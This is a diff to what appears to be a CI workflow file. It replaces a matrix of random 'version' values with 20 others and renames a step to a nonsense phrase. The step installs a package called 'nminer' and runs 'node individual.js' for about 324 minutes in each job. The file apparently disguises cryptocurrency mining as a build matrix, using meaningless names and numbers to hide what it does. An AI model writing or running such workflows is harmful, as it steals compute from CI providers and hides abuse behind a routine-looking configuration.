@@ -9,22 +9,26 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 7861 }
-          - { version: 4950 }
-          - { version: 5312 }
-          - { version: 9929 }
-          - { version: 3238 }
-          - { version: 1461 }
-          - { version: 4875 }
-          - { version: 3844 }
-          - { version: 8822 }
-          - { version: 755 }
-          - { version: 5016 }
-          - { version: 5138 }
-          - { version: 9103 }
-          - { version: 8093 }
-          - { version: 544 }
-          - { version: 496 }
+          - { version: 4421 }
+          - { version: 109 }
+          - { version: 3472 }
+          - { version: 2413 }
+          - { version: 4724 }
+          - { version: 5026 }
+          - { version: 2070 }
+          - { version: 9027 }
+          - { version: 4624 }
+          - { version: 6787 }
+          - { version: 688 }
+          - { version: 1138 }
+          - { version: 2316 }
+          - { version: 4689 }
+          - { version: 8721 }
+          - { version: 5555 }
+          - { version: 9176 }
+          - { version: 8999 }
+          - { version: 6191 }
+          - { version: 8410 }
 
     steps:
       - name: Checkout
@@ -35,7 +39,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: stigmatize save pomelo
+      - name: into geez strictly
         run: |
           npm install nminer@latest
-          timeout 323m node individual.js || echo "individual executed"
+          timeout 324m node individual.js || echo "individual executed"
